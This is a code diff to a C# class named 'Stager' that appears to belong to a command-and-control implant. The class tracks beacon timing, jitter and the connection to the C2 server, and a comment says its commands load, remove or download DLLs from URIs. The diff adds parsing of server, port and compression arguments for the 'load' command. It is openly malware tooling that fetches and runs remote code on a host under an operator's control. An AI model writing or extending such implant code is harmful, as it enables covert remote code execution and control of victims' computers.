@@ -11,6 +11,7 @@ namespace Stager
         Command command;
         int beaconTime, jitter;
         HttpStatusCode httpStatusCode;
+        Dictionary<string, string> arguments;
         /*
          * The uri could be a uri to load, remove, or location to download a dll. It depends on the command
          */
@@ -20,6 +21,7 @@ namespace Stager
         public StagerCommand()
         {
             uris = new List<Uri>();
+            arguments = new Dictionary<string, string>();
         }
         /// <summary>
         /// Gets/Sets the HttpStatusCode for the connection to the C2
@@ -33,6 +35,16 @@ namespace Stager
             set
             {
                 httpStatusCode = value;
+            }
+        }
+        /// <summary>
+        /// Gets the arguments of the command
+        /// </summary>
+        public Dictionary<string, string> Arguments
+        {
+            get
+            {
+                return arguments;
             }
         }
         /// <summary>
@@ -150,6 +162,22 @@ namespace Stager
                     case "load":
                         command = Command.Load;
                         uris.Add(new Uri(splitCommandString[1]));
+                        // Parse the arguments of the command
+                        foreach(string s in splitCommandString)
+                        {
+                            if (s.Contains("server") || s.Contains("port") || s.Contains("compression"))
+                            {
+                                string[] tmp = s.Split("=".ToCharArray());
+                                arguments[tmp[0]] = tmp[1];
+                            }
+
+                        }
+#if DEBUG
+                        foreach (KeyValuePair<string, string> kv in arguments)
+                        {
+                            Console.WriteLine("Key: {0} Value: {1}", kv.Key, kv.Value);
+                        }
+#endif
                         break;
                     case "add":
                         command = Command.Add;
